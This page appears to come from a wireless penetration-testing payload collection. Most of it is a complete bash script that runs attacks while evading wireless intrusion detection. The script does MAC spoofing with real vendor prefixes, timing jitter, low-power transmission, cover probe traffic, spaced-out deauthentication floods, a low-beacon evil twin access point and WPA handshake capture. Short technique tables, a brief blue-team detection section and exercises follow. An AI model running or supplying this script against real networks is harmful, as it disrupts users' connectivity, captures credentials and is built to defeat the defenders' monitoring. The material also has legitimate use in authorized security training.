# PP-A04: Wireless IDS Evasion

## Overview

| Attribute | Value |
|-----------|-------|
| **Payload ID** | PP-A04 |
| **Name** | Wireless IDS Evasion |
| **Category** | Advanced Attack |
| **Target** | Protected Networks |
| **Skill Level** | Advanced |
| **Risk Level** | High |

## Description

Advanced techniques for conducting wireless attacks while evading Wireless Intrusion Detection Systems (WIDS). Implements MAC spoofing, timing randomization, signal control, and behavioral mimicry to reduce detection probability.

---

## Complete Payload

```bash
#!/bin/bash
#####################################################
# Payload: PP-A04 - Wireless IDS Evasion
# Target: WIDS-Protected Networks
# Category: Advanced Attack
# Author: Security Trainer
# Version: 1.0.0
#
# WARNING: For authorized security testing only
#####################################################

# ============================================
# CONFIGURATION
# ============================================

# Interfaces
PRIMARY_IF="wlan1"
SECONDARY_IF="wlan0"

# Evasion settings
ENABLE_MAC_ROTATION="${ENABLE_MAC_ROTATION:-true}"
MAC_ROTATION_INTERVAL=300  # 5 minutes
ENABLE_TIMING_RANDOMIZATION="${ENABLE_TIMING_RANDOMIZATION:-true}"
MIN_DELAY=5
MAX_DELAY=30
ENABLE_POWER_CONTROL="${ENABLE_POWER_CONTROL:-true}"
TX_POWER=10  # dBm (lower = stealthier)
ENABLE_CHANNEL_HOPPING="${ENABLE_CHANNEL_HOPPING:-true}"
HOP_INTERVAL=60

# Attack timing
BURST_MODE="${BURST_MODE:-false}"
SPREAD_ATTACKS="${SPREAD_ATTACKS:-true}"
ATTACK_WINDOW_START=9   # 9 AM
ATTACK_WINDOW_END=17    # 5 PM

# Directories
LOOT_DIR="/sd/loot/evasion_$(date +%Y%m%d_%H%M%S)"
LOG_FILE="$LOOT_DIR/evasion.log"

# ============================================
# LOGGING
# ============================================

log() {
    local message="$1"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] $message" | tee -a "$LOG_FILE"
}

log_covert() {
    # Silent logging for sensitive operations
    local message="$1"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [COVERT] $message" >> "$LOG_FILE"
}

# ============================================
# MAC ADDRESS MANIPULATION
# ============================================

# Pool of legitimate-looking MAC prefixes (real vendor OUIs)
VENDOR_OUIS=(
    "00:1A:2B"  # Ayecom
    "00:1B:63"  # Apple
    "00:1E:C2"  # Apple
    "00:21:6A"  # Intel
    "00:24:D7"  # Intel
    "00:26:82"  # Cisco
    "00:50:56"  # VMware
    "3C:D9:2B"  # HP
    "58:B0:35"  # Samsung
    "AC:BC:32"  # Apple
)

generate_random_mac() {
    local oui="${VENDOR_OUIS[$RANDOM % ${#VENDOR_OUIS[@]}]}"
    local suffix=$(printf '%02X:%02X:%02X' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
    echo "$oui:$suffix"
}

change_mac() {
    local interface="$1"
    local new_mac="$2"

    log_covert "Changing MAC on $interface to $new_mac"

    ip link set "$interface" down 2>/dev/null
    ip link set "$interface" address "$new_mac" 2>/dev/null
    ip link set "$interface" up 2>/dev/null

    # Verify change
    local current=$(cat /sys/class/net/$interface/address 2>/dev/null)
    if [ "$current" = "$new_mac" ]; then
        return 0
    fi
    return 1
}

mac_rotation_daemon() {
    log "Starting MAC rotation daemon (interval: ${MAC_ROTATION_INTERVAL}s)"

    while true; do
        sleep $MAC_ROTATION_INTERVAL

        if [ "$ENABLE_MAC_ROTATION" = "true" ]; then
            local new_mac=$(generate_random_mac)
            change_mac "$PRIMARY_IF" "$new_mac"
            log_covert "MAC rotated to $new_mac"
        fi
    done &
    MAC_DAEMON_PID=$!
}

# ============================================
# TIMING EVASION
# ============================================

random_delay() {
    if [ "$ENABLE_TIMING_RANDOMIZATION" = "true" ]; then
        local delay=$((MIN_DELAY + RANDOM % (MAX_DELAY - MIN_DELAY + 1)))
        sleep $delay
    fi
}

calculate_jitter() {
    # Add random jitter to timing
    local base="$1"
    local variance="${2:-20}"  # percent
    local jitter=$((base * variance / 100))
    local actual=$((base + (RANDOM % (2 * jitter + 1)) - jitter))
    echo $actual
}

check_attack_window() {
    local hour=$(date +%H)

    if [ "$hour" -ge "$ATTACK_WINDOW_START" ] && [ "$hour" -lt "$ATTACK_WINDOW_END" ]; then
        return 0  # Within attack window
    fi
    return 1  # Outside attack window
}

wait_for_window() {
    if check_attack_window; then
        return 0
    fi

    log "Outside attack window. Waiting..."
    while ! check_attack_window; do
        sleep 300  # Check every 5 minutes
    done
    log "Attack window active"
}

# ============================================
# SIGNAL/POWER CONTROL
# ============================================

set_tx_power() {
    local interface="$1"
    local power="$2"

    if [ "$ENABLE_POWER_CONTROL" = "true" ]; then
        log_covert "Setting TX power to ${power}dBm on $interface"
        iw dev "$interface" set txpower fixed $((power * 100)) 2>/dev/null
    fi
}

adaptive_power() {
    local target_rssi="$1"
    local current_rssi="$2"
    local current_power="$3"

    # Adjust power to maintain consistent signal strength
    local diff=$((current_rssi - target_rssi))

    if [ $diff -gt 5 ]; then
        # Too strong, reduce power
        echo $((current_power - 2))
    elif [ $diff -lt -5 ]; then
        # Too weak, increase power
        echo $((current_power + 2))
    else
        echo $current_power
    fi
}

# ============================================
# CHANNEL HOPPING
# ============================================

CHANNELS_24=(1 2 3 4 5 6 7 8 9 10 11)
CHANNELS_5=(36 40 44 48 52 56 60 64 100 104 108 112 116 120 124 128 132 136 140 149 153 157 161 165)

random_channel() {
    local band="${1:-24}"

    if [ "$band" = "5" ]; then
        echo "${CHANNELS_5[$RANDOM % ${#CHANNELS_5[@]}]}"
    else
        echo "${CHANNELS_24[$RANDOM % ${#CHANNELS_24[@]}]}"
    fi
}

channel_hop_daemon() {
    log "Starting channel hopping daemon (interval: ${HOP_INTERVAL}s)"

    while true; do
        sleep $HOP_INTERVAL

        if [ "$ENABLE_CHANNEL_HOPPING" = "true" ]; then
            local new_channel=$(random_channel)
            iw dev "$PRIMARY_IF" set channel $new_channel 2>/dev/null
            log_covert "Hopped to channel $new_channel"
        fi
    done &
    CHANNEL_DAEMON_PID=$!
}

# ============================================
# BEHAVIORAL MIMICRY
# ============================================

mimic_legitimate_client() {
    local interface="$1"

    log_covert "Mimicking legitimate client behavior"

    # Generate realistic probe requests
    local common_ssids=(
        "attwifi"
        "xfinitywifi"
        "Starbucks WiFi"
        "Google WiFi"
        "AndroidAP"
    )

    for ssid in "${common_ssids[@]}"; do
        # Send probe request (if tool available)
        if command -v mdk3 >/dev/null 2>&1; then
            timeout 1 mdk3 "$interface" p -t "${ssid}" -s 1 2>/dev/null
        fi
        random_delay
    done
}

fragment_deauth() {
    local target_bssid="$1"
    local interface="$2"
    local total_packets="${3:-10}"

    log_covert "Fragmenting deauth across time"

    # Spread deauth packets over time instead of burst
    local packets_sent=0

    while [ $packets_sent -lt $total_packets ]; do
        # Send single packet
        aireplay-ng --deauth 1 -a "$target_bssid" "$interface" >/dev/null 2>&1
        packets_sent=$((packets_sent + 1))

        # Random delay between packets
        local delay=$(calculate_jitter 30 50)
        sleep $delay
    done
}

slow_scan() {
    local interface="$1"
    local output="$2"
    local duration="${3:-300}"

    log "Starting slow scan (duration: ${duration}s)"

    # Scan with extended dwell time and randomized timing
    local channels=(1 6 11)  # Focus on non-overlapping channels
    local dwell_time=30

    for channel in "${channels[@]}"; do
        iw dev "$interface" set channel $channel 2>/dev/null
        random_delay

        # Capture on this channel
        timeout $dwell_time tcpdump -i "$interface" -w "${output}_ch${channel}.pcap" 2>/dev/null

        random_delay
    done
}

# ============================================
# TRAFFIC BLENDING
# ============================================

generate_cover_traffic() {
    local interface="$1"

    log_covert "Generating cover traffic"

    # Generate normal-looking traffic to blend in
    while true; do
        # Periodic probe requests (like a searching device)
        if [ $((RANDOM % 10)) -lt 3 ]; then
            mimic_legitimate_client "$interface"
        fi

        # Random sleep between activities
        sleep $((60 + RANDOM % 120))
    done &
    COVER_TRAFFIC_PID=$!
}

# ============================================
# DETECTION AVOIDANCE
# ============================================

check_for_wids() {
    local interface="$1"

    log "Checking for WIDS presence..."

    # Look for common WIDS signatures
    local wids_indicators=0

    # Check for Kismet
    if timeout 30 tcpdump -i "$interface" -c 100 2>/dev/null | grep -q "kismet"; then
        wids_indicators=$((wids_indicators + 1))
        log "WARNING: Kismet-like traffic detected"
    fi

    # Check for unusual beacon rates (WIDS sensors)
    local beacon_count=$(timeout 10 tcpdump -i "$interface" 2>/dev/null | grep -c "Beacon")
    if [ "$beacon_count" -gt 50 ]; then
        log "WARNING: High beacon density (possible WIDS sensors)"
    fi

    # Check for deauth detection responses
    # (Some WIDS will probe after detecting deauths)

    return $wids_indicators
}

adapt_to_detection() {
    local detection_level="$1"

    log "Adapting to detection level: $detection_level"

    case "$detection_level" in
        0)
            # Low detection risk - normal operation
            MIN_DELAY=5
            MAX_DELAY=30
            ;;
        1)
            # Medium detection risk - increase delays
            MIN_DELAY=30
            MAX_DELAY=120
            MAC_ROTATION_INTERVAL=120
            ;;
        2|*)
            # High detection risk - maximum evasion
            MIN_DELAY=60
            MAX_DELAY=300
            MAC_ROTATION_INTERVAL=60
            ENABLE_POWER_CONTROL=true
            TX_POWER=5
            ;;
    esac
}

# ============================================
# EVASIVE ATTACK FUNCTIONS
# ============================================

evasive_scan() {
    local interface="$1"
    local output="$2"

    log "Starting evasive scan..."

    # Rotate MAC before scan
    if [ "$ENABLE_MAC_ROTATION" = "true" ]; then
        change_mac "$interface" "$(generate_random_mac)"
    fi

    # Lower TX power
    set_tx_power "$interface" $TX_POWER

    # Slow, randomized scan
    slow_scan "$interface" "$output" 300

    log "Evasive scan complete"
}

evasive_deauth() {
    local target_bssid="$1"
    local interface="$2"
    local target_mac="${3:-FF:FF:FF:FF:FF:FF}"

    log_covert "Executing evasive deauthentication"

    # Wait for appropriate timing
    if [ "$SPREAD_ATTACKS" = "true" ]; then
        wait_for_window
    fi

    # Rotate MAC
    if [ "$ENABLE_MAC_ROTATION" = "true" ]; then
        change_mac "$interface" "$(generate_random_mac)"
    fi

    # Lower power
    set_tx_power "$interface" $TX_POWER

    # Fragment the attack over time
    fragment_deauth "$target_bssid" "$interface" 10

    log_covert "Evasive deauth complete"
}

evasive_evil_twin() {
    local target_ssid="$1"
    local target_channel="$2"
    local interface="$3"

    log "Starting evasive Evil Twin..."

    # Use legitimate-looking MAC
    local fake_mac=$(generate_random_mac)
    change_mac "$interface" "$fake_mac"

    # Create minimal hostapd config
    cat > /tmp/hostapd_evasive.conf << EOF
interface=$interface
driver=nl80211
ssid=$target_ssid
hw_mode=g
channel=$target_channel
# Minimal beaconing to avoid detection
beacon_int=200
dtim_period=3
EOF

    # Lower TX power significantly
    set_tx_power "$interface" 5

    # Start with minimal beacon rate
    hostapd -B /tmp/hostapd_evasive.conf

    # Monitor for detection and adapt
    while true; do
        check_for_wids "$interface"
        local detection=$?
        adapt_to_detection $detection

        sleep 60
    done
}

evasive_handshake_capture() {
    local target_bssid="$1"
    local target_channel="$2"
    local interface="$3"

    log "Starting evasive handshake capture..."

    # Setup with evasion
    change_mac "$interface" "$(generate_random_mac)"
    set_tx_power "$interface" $TX_POWER

    airmon-ng start "$interface" >/dev/null 2>&1
    local mon="${interface}mon"

    # Start capture
    local capture_file="$LOOT_DIR/handshake"
    airodump-ng -c "$target_channel" \
        --bssid "$target_bssid" \
        -w "$capture_file" \
        "$mon" &
    CAP_PID=$!

    # Evasive deauth - spread over time
    local attempts=0
    local max_attempts=20

    while [ $attempts -lt $max_attempts ]; do
        random_delay

        # Single deauth packet
        aireplay-ng --deauth 1 -a "$target_bssid" "$mon" >/dev/null 2>&1
        attempts=$((attempts + 1))

        # Check for handshake
        if aircrack-ng "${capture_file}-01.cap" 2>&1 | grep -q "1 handshake"; then
            log "Handshake captured!"
            break
        fi

        # Long random delay
        sleep $(calculate_jitter 60 50)
    done

    kill $CAP_PID 2>/dev/null
    airmon-ng stop "$mon" >/dev/null 2>&1
}

# ============================================
# CLEANUP
# ============================================

cleanup() {
    log "Cleaning up..."

    # Stop daemons
    kill $MAC_DAEMON_PID 2>/dev/null
    kill $CHANNEL_DAEMON_PID 2>/dev/null
    kill $COVER_TRAFFIC_PID 2>/dev/null

    # Stop monitor mode
    airmon-ng stop "${PRIMARY_IF}mon" 2>/dev/null

    # Restore original MAC
    local original_mac=$(cat /tmp/original_mac.txt 2>/dev/null)
    if [ -n "$original_mac" ]; then
        change_mac "$PRIMARY_IF" "$original_mac"
    fi

    # Generate report
    generate_report

    log "Cleanup complete"
    exit 0
}

generate_report() {
    cat > "$LOOT_DIR/evasion_report.txt" << EOF
========================================
WIDS Evasion Operation Report
========================================

Operation Time: $(date)

Evasion Settings Used:
  MAC Rotation: $ENABLE_MAC_ROTATION (interval: ${MAC_ROTATION_INTERVAL}s)
  Timing Randomization: $ENABLE_TIMING_RANDOMIZATION (${MIN_DELAY}-${MAX_DELAY}s)
  Power Control: $ENABLE_POWER_CONTROL (${TX_POWER}dBm)
  Channel Hopping: $ENABLE_CHANNEL_HOPPING (interval: ${HOP_INTERVAL}s)
  Attack Window: ${ATTACK_WINDOW_START}:00-${ATTACK_WINDOW_END}:00

Files Generated:
$(ls -la "$LOOT_DIR/" 2>/dev/null)

EOF
}

trap cleanup SIGINT SIGTERM EXIT

# ============================================
# MAIN
# ============================================

main() {
    log "=========================================="
    log "PP-A04: Wireless IDS Evasion"
    log "=========================================="

    mkdir -p "$LOOT_DIR"

    # Save original MAC
    cat /sys/class/net/$PRIMARY_IF/address > /tmp/original_mac.txt 2>/dev/null

    # Check for WIDS presence
    airmon-ng start "$PRIMARY_IF" >/dev/null 2>&1
    check_for_wids "${PRIMARY_IF}mon"
    local detection_level=$?
    adapt_to_detection $detection_level
    airmon-ng stop "${PRIMARY_IF}mon" >/dev/null 2>&1

    # Start evasion daemons
    mac_rotation_daemon
    channel_hop_daemon
    generate_cover_traffic "$SECONDARY_IF"

    log "Evasion systems active"
    log "Ready for covert operations"

    # Example operation - can be modified
    evasive_scan "${PRIMARY_IF}" "$LOOT_DIR/scan"

    # Keep running
    while true; do
        sleep 60
        log "Evasion systems running..."
    done
}

# ============================================
# EXECUTE
# ============================================

main "$@"
```

---

## Evasion Techniques Summary

### 1. MAC Address Manipulation
| Technique | Purpose |
|-----------|---------|
| Vendor OUI Pool | Use real manufacturer prefixes |
| Periodic Rotation | Change identity over time |
| Per-Attack Rotation | Fresh MAC for each action |

### 2. Timing Evasion
| Technique | Purpose |
|-----------|---------|
| Random Delays | Avoid pattern detection |
| Jitter | Vary timing within ranges |
| Attack Windows | Blend with business hours |
| Fragmentation | Spread packets over time |

### 3. Signal Control
| Technique | Purpose |
|-----------|---------|
| Low TX Power | Reduce detection range |
| Adaptive Power | Maintain consistent RSSI |
| Directional Focus | Target specific areas |

### 4. Behavioral Mimicry
| Technique | Purpose |
|-----------|---------|
| Cover Traffic | Blend with normal activity |
| Legitimate Probes | Look like real device |
| Slow Scanning | Avoid burst detection |

---

## Blue Team Perspective

### Detection Methods

| Evasion Technique | Counter-Detection |
|-------------------|-------------------|
| MAC Rotation | Behavioral fingerprinting |
| Timing Randomization | Statistical analysis |
| Low Power | Correlation across sensors |
| Cover Traffic | Traffic baseline anomalies |

### WIDS Tuning Recommendations

```bash
# Increase sensitivity for:
# - Out-of-baseline probing patterns
# - Unusual timing sequences
# - Multiple MACs with similar behavior
# - Low-power transmissions from unexpected locations

# Deploy distributed sensors for:
# - Signal triangulation
# - Cross-correlation of events
# - Coverage of all channels
```

---

## Practice Exercises

### Exercise 1: Detection Testing
Set up a test WIDS (Kismet) and verify evasion effectiveness.

### Exercise 2: Custom MAC Pool
Create a MAC pool specific to devices commonly seen in target environment.

### Exercise 3: Adaptive Evasion
Implement real-time detection feedback to automatically adjust evasion parameters.

---

[← PP-A03 Automated WPA Cracker](PP-A03_Automated_WPA_Cracker.md) | [Back to Advanced](README.md) | [Next: PP-A05 Enterprise Attack Suite →](PP-A05_Enterprise_Attack.md)
